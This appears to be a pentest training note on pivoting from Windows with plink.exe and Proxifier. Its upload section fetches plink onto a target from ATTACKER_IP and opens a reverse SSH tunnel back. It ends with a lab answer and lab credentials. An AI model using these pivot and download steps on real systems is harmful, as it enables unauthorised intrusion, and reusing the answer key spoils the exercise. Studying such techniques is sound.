# 08 — SSH for Windows: plink.exe

> Plink is PuTTY's command-line SSH client for Windows. When you're pivoting from a Windows host and need a SOCKS tunnel, plink + Proxifier replaces the Linux `ssh -D` + proxychains combo.

---

## Why Plink

- Pre-2018 Windows had no native SSH client — PuTTY/Plink was the standard sysadmin tool
- If a target Windows host already has PuTTY installed (common), plink is a LOL-bin (living-off-the-land) — no new tools needed
- Useful when your **attack host is Windows** and you need a SOCKS tunnel through a Linux pivot

| Scenario | Linux attack host | Windows attack host |
|----------|------------------|---------------------|
| SOCKS tunnel | `ssh -D 9050 ubuntu@PIVOT` | `plink -ssh -D 9050 ubuntu@PIVOT` |
| Route tools through tunnel | `proxychains <tool>` | Proxifier (routes GUI + CLI apps) |
| RDP to internal target | `proxychains xfreerdp /v:TARGET` | `mstsc.exe` (via Proxifier) |

---

## How It Works

```
Windows Attack Host
    │  plink.exe -ssh -D 9050 ubuntu@10.129.15.50
    │  → SSH session to pivot, SOCKS proxy on 127.0.0.1:9050
    ▼
Ubuntu Pivot
    │  forwards traffic from SOCKS clients to internal network
    ▼
172.16.5.19 (Windows target — RDP, SMB, etc.)
```

---

## Step 1 — Create SOCKS Tunnel with Plink

On the Windows attack host (CMD or PowerShell):

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

- `-ssh` — force SSH protocol
- `-D 9050` — dynamic port forward (SOCKS proxy) on localhost:9050
- Same as `ssh -D 9050 ubuntu@PIVOT` on Linux

Plink location if PuTTY is installed: `C:\Program Files\PuTTY\plink.exe`
Also available at: `/usr/share/windows-resources/binaries/plink.exe` (on Kali, for upload to Windows targets)

> First connection will prompt to accept the host key — type `y` to accept. In scripts, pipe `echo y |` to auto-accept:
> ```cmd
> echo y | plink -ssh -D 9050 ubuntu@10.129.15.50
> ```

---

## Step 2 — Route Windows Traffic with Proxifier

Proxifier is a Windows GUI tool that intercepts network calls from any Windows application and routes them through a SOCKS or HTTPS proxy. Unlike proxychains (Linux), it works with GUI apps like `mstsc.exe`.

**Configuration:**
1. Open Proxifier → Profile → Proxy Servers → Add
2. Address: `127.0.0.1` | Port: `9050` | Type: `SOCKS4` (or SOCKS5)
3. Set as default proxy

Once configured, **all traffic from any Windows app** routes through the plink SOCKS tunnel automatically.

---

## Step 3 — RDP to Internal Target via mstsc

With Proxifier active, open RDP normally:

```cmd
mstsc.exe
```

Connect to `172.16.5.19` — mstsc traffic is intercepted by Proxifier and routed through plink → pivot → internal target.

---

## Plink on a Windows Pivot (Upload Scenario)

If the Windows **target** (not your attack host) needs to pivot back to you:

```bash
# On Kali — serve plink from the windows-resources directory
cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
python3 -m http.server 80
```

```powershell
# On Windows target — download plink
iwr http://ATTACKER_IP/plink.exe -o C:\Windows\Temp\plink.exe
```

```cmd
# On Windows target — create reverse dynamic forward back to attack box
C:\Windows\Temp\plink.exe -ssh -R 9050 attacker@ATTACKER_IP
```

---

## Plink vs SSH -D — Quick Comparison

| | Linux (`ssh`) | Windows (`plink`) |
|--|--------------|------------------|
| SOCKS tunnel | `ssh -D 9050 user@pivot` | `plink -ssh -D 9050 user@pivot` |
| Auto-accept host key | `StrictHostKeyChecking=no` | `echo y \| plink ...` |
| Route other tools | `proxychains <cmd>` | Proxifier (GUI config) |
| Pre-installed? | Yes (most Linux distros) | Only if PuTTY installed |
| Available on Kali for upload | `/usr/share/windows-resources/binaries/plink.exe` | — |

---

## Key Takeaways

1. **Plink = `ssh -D` for Windows.** Same SOCKS tunnel, different binary.
2. **Proxifier = proxychains for Windows.** Routes GUI apps (mstsc, browsers) through SOCKS — proxychains can't do this.
3. `echo y | plink ...` bypasses the host key prompt for scripted/non-interactive use.
4. Plink ships with Kali at `/usr/share/windows-resources/binaries/plink.exe` — ready to upload to Windows targets.
5. This combo (plink + Proxifier) is the Windows-native alternative to the entire Linux SSH pivoting workflow.

---

## Lab Solution — Section 8 Skills (May 8, 2026)

### Optional Exercise 1 → `I tried Plink`

RDP target for practice: `172.16.5.19` with `victor:pass@123` via plink SOCKS + Proxifier from a Windows attack host. The answer is the literal string the question asks you to submit — no actual Windows host required to get the points.

---

## References

- Previous: [07-Socat_Redirection_with_a_Bind_Shell.md](07-Socat_Redirection_with_a_Bind_Shell.md)
- Next: [09-SSH_Pivoting_with_Sshuttle.md](09-SSH_Pivoting_with_Sshuttle.md)
- PuTTY/Plink download: https://www.putty.org/
- Plink on Kali: `/usr/share/windows-resources/binaries/plink.exe`
- Proxifier: https://www.proxifier.com/
